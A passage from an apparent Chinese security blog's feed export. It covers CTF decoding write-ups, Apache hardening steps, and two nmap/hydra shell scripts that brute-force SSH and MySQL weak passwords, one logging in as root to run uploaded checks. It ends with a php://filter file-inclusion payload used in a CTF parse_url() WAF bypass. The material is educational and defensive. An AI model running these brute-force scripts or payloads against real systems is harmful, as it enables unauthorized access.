alt="mark"><br><strong>解密出如下内容</strong></p><pre><code>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</code></pre><p><strong>可以看到是一串类似16进制的编码，16进制解码后得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bFh7k8HJ5B.png?imageslim" alt="mark"></p><pre><code>R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF</code></pre><p><strong>再进行base64解码得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/cLef2ge7I5.png?imageslim" alt="mark"></p><pre><code>GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E</code></pre><p><strong>发现不能继续base64解码，于是尝试<a href="http://www.qqxiuzi.cn/bianma/base.php" title="base32解码" target="_blank" rel="external">base32解码</a>，又得到一串16进制编码的字符</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/793HGfBemk.png?imageslim" alt="mark"></p><pre><code>5231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D</code></pre><p><strong>再次16进制解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/J2fg7abC8c.png?imageslim" alt="mark"></p><pre><code>R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ==</code></pre><p><strong>再次进行base64解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/7DdBIaa74k.png?imageslim" alt="mark"></p><pre><code>GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A====</code></pre><p><strong>发现又不能进行base64解码了，于是用base32解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/di5KkBGC4l.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h7eDbL5I2d.png?imageslim" alt="mark"></p><pre><code>463161395F69735F493563635F5A4F6C385F4733545030314E54</code></pre><p><strong>再进行16进制解码，就能得到flag了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/FIfeCBbcjl.png?imageslim" alt="mark"></p><pre><code>flag：F1a9_is_I5cc_ZOl8_G3TP01NT</code></pre><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p><strong>HINT：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</strong></p><p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bf79A2KllA.png?imageslim" alt="mark"><br><strong>用winhex查看一下该图片，发现文件尾有一些编码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/gI0A6GlK8a.png?imageslim" alt="mark"></p><pre><code>&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#55;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#98;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#101;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#100; </code></pre><p><strong>html解码一下，发现是一串unicode</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/jKbC755A7f.png?imageslim" alt="mark"></p><pre><code>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d </code></pre><p><strong>unicode解码一下，这里直接用python输出就好，得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/047IB022ac.png?imageslim" alt="mark"></p><pre><code>flag{iscc is fun}</code></pre><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p><strong>HINT：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</strong></p><p><strong>根据提示先将这串字符<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" title="rot13解密" target="_blank" rel="external">rot13解密</a>一下，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j663FihbdA.png?imageslim" alt="mark"></p><pre><code>roqtp697t95j3</code></pre><p><strong>再查看键盘，找到这些字符串每个字符在键盘上下面位置的字符，比如<code>r</code>下面的字符为<code>f</code>，依次替换就能得到flag</strong></p><pre><code>flag:yougotme</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ISCC2018-write-up&quot;&gt;&lt;a href=&quot;#ISCC2018-write-up&quot; class=&quot;headerlink&quot; title=&quot;ISCC2018 write up&quot;&gt;&lt;/a&gt;ISCC2018 write up&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Apache安全加固</title>
    <link href="http://yoursite.com/2018/05/19/apache_security_config/"/>
    <id>http://yoursite.com/2018/05/19/apache_security_config/</id>
    <published>2018-05-19T15:38:59.866Z</published>
    <updated>2018-06-03T13:54:40.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h1><p><strong>这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos</strong><br><a id="more"></a></p><h2 id="服务器banner信息隐藏"><a href="#服务器banner信息隐藏" class="headerlink" title="服务器banner信息隐藏"></a>服务器banner信息隐藏</h2><h3 id="404页面以及http响应头信息泄露"><a href="#404页面以及http响应头信息泄露" class="headerlink" title="404页面以及http响应头信息泄露"></a>404页面以及http响应头信息泄露</h3><p><strong>如果对服务器一个不存在的资源进行访问，网站返回的404页面将会泄露apache版本，服务器操作系统类型等信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180519/90D016lEic.png?imageslim" alt="mark"><br><strong>可以看到404错误页面显示了apache的版本、服务器的操作系统类型、ip和端口</strong></p><p><strong>还有就是在http的响应头中，也会泄露有关服务器的一些信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E6ibcfJ04E.png?imageslim" alt="mark"><br><strong>http响应头的Server中泄露了apache的版本和服务器操作系统类型</strong></p><p><strong>加固方案：需要修改apache配置文件的两个地方，配置文件位置：<code>/etc/httpd/conf/httpd.conf</code>,将对应的参数修改成下面的值</strong></p><pre><code>ServerTokens ProdServerSignature Off</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5DDcBfL29g.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/k9j741e1cA.png?imageslim" alt="mark"><br><strong>修改完后重启服务,就可以修复了，可以看到这些信息不再出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/L4F39GedbG.png?imageslim" alt="mark"></p><h3 id="http响应头泄露php版本信息"><a href="#http响应头泄露php版本信息" class="headerlink" title="http响应头泄露php版本信息"></a>http响应头泄露php版本信息</h3><p><strong>http响应头中的X-Powered-By泄露了php版本信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i1JI409h8c.png?imageslim" alt="mark"><br><strong>加固方案：修改php配置文件，配置文件位置：<code>/etc/php.ini</code>，修改参数</strong></p><pre><code>expose_php=Off</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/eHK8lHCE4k.png?imageslim" alt="mark"><br><strong>修改完成后，重启apache服务，php版本信息不再显示</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/D8gfh8iBCi.png?imageslim" alt="mark"></p><h2 id="修改apache默认主页"><a href="#修改apache默认主页" class="headerlink" title="修改apache默认主页"></a>修改apache默认主页</h2><h3 id="apache默认主页信息泄露"><a href="#apache默认主页信息泄露" class="headerlink" title="apache默认主页信息泄露"></a>apache默认主页信息泄露</h3><p><strong>当apache安装完成后，apache的默认主页会泄露服务器的一些信息</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BcDmc95fcG.png?imageslim" alt="mark"><br><strong>可以看到apache默认页面泄露了网站的根目录和某配置文件</strong></p><p><strong>加固方案：修改apache配置文件中的DirectoryIndex，并在网站根目录自定义index.html或者index.php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/4LkC4jeEBG.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/cEK1GFb0fJ.png?imageslim" alt="mark"><br><strong>修改完成后不再显示默认页</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/Fb38bd4llF.png?imageslim" alt="mark"></p><h2 id="自定义404页面"><a href="#自定义404页面" class="headerlink" title="自定义404页面"></a>自定义404页面</h2><p><strong>为了安全考虑和与网站用户的友好交互，自定义404页面也是件必要的事情</strong></p><p><strong>加固方法：在网上寻找404页面模板上传至服务器网站根目录，修改apache配置文件，找到<code>ErrorDocument 404</code>,将自定义的404页面路径添加上去</strong></p><pre><code>ErrorDocument 404 /404page/index.html</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/DfhJ1f3laC.png?imageslim" alt="mark"><br><strong>同时修改404的html文件，修改css，js文件的加载路径，不然css和js会因为请求不到资源而加载失败</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/AhLkBAekKD.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/EIgCFDal5A.png?imageslim" alt="mark"><br><strong>重启apache服务</strong></p><p><strong>修改前的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9ECKkDDEbh.png?imageslim" alt="mark"><br><strong>修改后的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/m70eLc5Fc3.png?imageslim" alt="mark"></p><h2 id="防止列目录泄露敏感信息"><a href="#防止列目录泄露敏感信息" class="headerlink" title="防止列目录泄露敏感信息"></a>防止列目录泄露敏感信息</h2><p><strong>网站允许列目录是个很严重的安全问题，有时由于列目录可能会导致一些配置文件或者一些重要敏感信息泄露</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/l3hi9EH7d6.png?imageslim" alt="mark"><br><strong>加固方案：其中一种加固方案就是在每个目录下都设置一个默认页（index.html或者index.php），这样可以防止列目录，但是会比较麻烦.另外一种方式就是修改apache的配置文件，将网站根目录<code>/var/www/html</code>下的<code>Options Indexes FollowSymLinks</code>改为<code>Options FollowSymLinks</code>,将indexes参数去掉</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LeG2c9gJGG.png?imageslim" alt="mark"><br><strong>修改完成后重启服务，再次访问目录就会出现403禁止访问的页面，但是目录下的页面还是可以照常访问，只是禁止了列目录的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kJfeFbbH70.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kk09aFAaeg.png?imageslim" alt="mark"></p><h2 id="禁用php危险函数"><a href="#禁用php危险函数" class="headerlink" title="禁用php危险函数"></a>禁用php危险函数</h2><p><strong>php有些函数如果开启的话，当黑客拿下一个webshell就会利用函数取执行一些危险命令，所以可以把一些危险函数禁用掉，以phpinfo为例，修改php配置文件<code>/etc/php.ini</code>,查找<code>disable_funcions</code>，配置</strong></p><pre><code>disable_funcions=phpinfo</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0Cd68AI7hC.png?imageslim" alt="mark"><br><strong>修改前</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/c06CGjEle1.png?imageslim" alt="mark"><br><strong>修改后</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/B227gA44Em.png?imageslim" alt="mark"></p><h2 id="指定目录禁止php解析"><a href="#指定目录禁止php解析" class="headerlink" title="指定目录禁止php解析"></a>指定目录禁止php解析</h2><p><strong>通常，向一些上传图片的目录，如果代码层对文件上传没有做好限制，导致黑客上传php代码getshell，所以对指定目录禁止php解析是很有必要的</strong></p><p><strong>比如网站上传目录被上传了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/CJ1KJe707J.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/43F7LhCH5J.png?imageslim" alt="mark"><br><strong>可以连接webshell，这是很严重的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0DmGmab529.png?imageslim" alt="mark"></p><p><strong>加固方案，修改apache配置文件，设置指定目录没有执行php的权限，在配置文件中添加</strong></p><pre><code>&lt;Directory &quot;/var/www/html/uploads&quot;&gt;    php_flag engine off&lt;/Directory&gt;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/3E7LaFlicG.png?imageslim" alt="mark"><br><strong>重启服务，可以看到由于uploads目录下禁止解析php脚本了，所以此时webshell就不能连接了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G2IGhHemdG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Apache安全加固&quot;&gt;&lt;a href=&quot;#Apache安全加固&quot; class=&quot;headerlink&quot; title=&quot;Apache安全加固&quot;&gt;&lt;/a&gt;Apache安全加固&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全加固" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
      <category term="Apache" scheme="http://yoursite.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>用shell实现对指定ip进行自动基线安全检查</title>
    <link href="http://yoursite.com/2018/05/17/autocheck/"/>
    <id>http://yoursite.com/2018/05/17/autocheck/</id>
    <published>2018-05-17T15:14:50.395Z</published>
    <updated>2018-06-04T14:56:58.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell脚本实现对指定ip进行自动基线安全检查"><a href="#用shell脚本实现对指定ip进行自动基线安全检查" class="headerlink" title="用shell脚本实现对指定ip进行自动基线安全检查"></a>用shell脚本实现对指定ip进行自动基线安全检查</h1><p><strong>最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器</strong><br><a id="more"></a></p><p><strong>scp.exp:发送基线脚本到指定ip的服务器</strong></p><pre><code>#!/usr/bin/expect -fset timeout 10set host [lindex $argv 0]set username [lindex $argv 1]set password [lindex $argv 2]set src_file [lindex $argv 3]set dest_file [lindex $argv 4]spawn scp -r $src_file $username@$host:/tmp/$dest_fileexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }}expect &quot;100%&quot;expect eof:</code></pre><p><strong>excute.exp：ssh登陆指定ip执行之前上传的基线脚本，并且将运行结果的文件发送回来</strong></p><pre><code>#!/usr/bin/expect -f set ip [lindex $argv 0 ]set password [lindex $argv 1 ]set timeout 10spawn ssh root@$ip expect { &quot;*yes/no&quot; { send &quot;yes\r&quot;; exp_continue}&quot;*password:&quot; { send &quot;$password\r&quot; }}expect {&quot;#*&quot;  { send &quot;pwd\r cd /tmp/\r ./66c221be-6ab2-ef53-1589-fe16877914f4.sh $ip\r&quot; }}spawn scp root@$ip:/tmp/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml /root/autocheck/report/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xmlexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }} expect eofexit</code></pre><p><strong>ip.list：存放需要检查的ip列表</strong></p><p><strong>autocheck.sh：读取ip列表，检查存活的主机，过滤出开放22端口的主机ip，调用之前写的两个脚本去自动传送基线检查脚本执行并且将结果返回回来</strong></p><pre><code>#!/bin/bashfor ip in `cat ip.list`donewip=`nmap -Pn -sS -p 22 $ip|grep &quot;open&quot; -B4|awk &apos;/Nmap scan/{print $5}&apos;`hydra -l root -p 123456 $newip ssh|grep &quot;password:&quot;if [ $? == 0 ]then./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot;./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot;./excute.exp $newip &quot;123456&quot;elsecontinuefidone</code></pre><p><strong>执行./autocheck.sh后的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/9DhgKGAfg5.png?imageslim" alt="mark"><br><strong>可以看到report目录下就是返回来的文件，里面存放着linux基线扫描的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/HaAkCfiD57.png?imageslim" alt="mark"></p><p><strong>还可以改进的地方，这个脚本用户名密码写死了，可以再加一个用户名密码文件，读取用户名密码登录，然后检查，这样会更有实际意义，自己会不断完善功能，希望在以后的实习中可以直接用到。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;a href=&quot;#用shell脚本实现对指定ip进行自动基线安全检查&quot; class=&quot;headerlink&quot; title=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;/a&gt;用shell脚本实现对指定ip进行自动基线安全检查&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
  <entry>
    <title>用shell实现自动化扫描主机端口爆破服务弱口令</title>
    <link href="http://yoursite.com/2018/05/14/autobrute/"/>
    <id>http://yoursite.com/2018/05/14/autobrute/</id>
    <published>2018-05-14T08:36:34.456Z</published>
    <updated>2018-06-04T14:55:53.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell实现自动化扫描主机端口爆破服务弱口令"><a href="#用shell实现自动化扫描主机端口爆破服务弱口令" class="headerlink" title="用shell实现自动化扫描主机端口爆破服务弱口令"></a>用shell实现自动化扫描主机端口爆破服务弱口令</h1><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong><br><a id="more"></a></p><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p><p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p><h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p><p><strong>ip.txt</strong></p><pre><code>ip列表，里面放着要扫描的ip</code></pre><p><strong>service.conf</strong></p><pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p><pre><code>22:ssh3306:mysql</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p><p><strong>user.txt</strong></p><pre><code>存放着常见的用户名，用于hydra爆破</code></pre><p><strong>passwd.txt</strong></p><pre><code>存放着常见的弱口令，用于hydra爆破</code></pre><p><strong>brute.sh</strong></p><pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作#!/bin/bashfilename=$1for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`doname=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`echo &quot;$name weak password result:&quot;nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txtnmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txtif [ ! -s tmpip.txt ]thenecho &quot;no ip open port $port&quot;elseresult=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`echo $resultfidone</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p><p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p><p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;a href=&quot;#用shell实现自动化扫描主机端口爆破服务弱口令&quot; class=&quot;headerlink&quot; title=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;/a&gt;用shell实现自动化扫描主机端口爆破服务弱口令&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
  <entry>
    <title>php parse_url()函数的漏洞</title>
    <link href="http://yoursite.com/2018/05/13/parse_url/"/>
    <id>http://yoursite.com/2018/05/13/parse_url/</id>
    <published>2018-05-13T10:11:57.382Z</published>
    <updated>2018-06-04T15:10:21.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-parse-url-函数的漏洞"><a href="#php-parse-url-函数的漏洞" class="headerlink" title="php parse_url()函数的漏洞"></a>php parse_url()函数的漏洞</h1><p><strong>在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤</strong><br><a id="more"></a><br><strong>来看代码</strong></p><pre><code>&lt;?php$url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);parse_str($url[&apos;query&apos;],$query);var_dump($query); ?&gt;</code></pre><p><strong>访问url：<a href="http://127.0.0.1/info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1/info/parseurl.php?sql=select</a></strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim" alt="mark"><br><strong>这里会是url中正常的参数值</strong></p><p><strong>如果访问url:<a href="http://127.0.0.1///info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1///info/parseurl.php?sql=select</a></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim" alt="mark"><br><strong>这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤</strong></p><p><strong>来看一道ctf题</strong></p><pre><code>http://118.126.113.78/web1/?id=1</code></pre><p><strong>已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim" alt="mark"><br><strong>利用php伪协议文件包含读取waf.php的源代码</strong>    </p><pre><code>http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim" 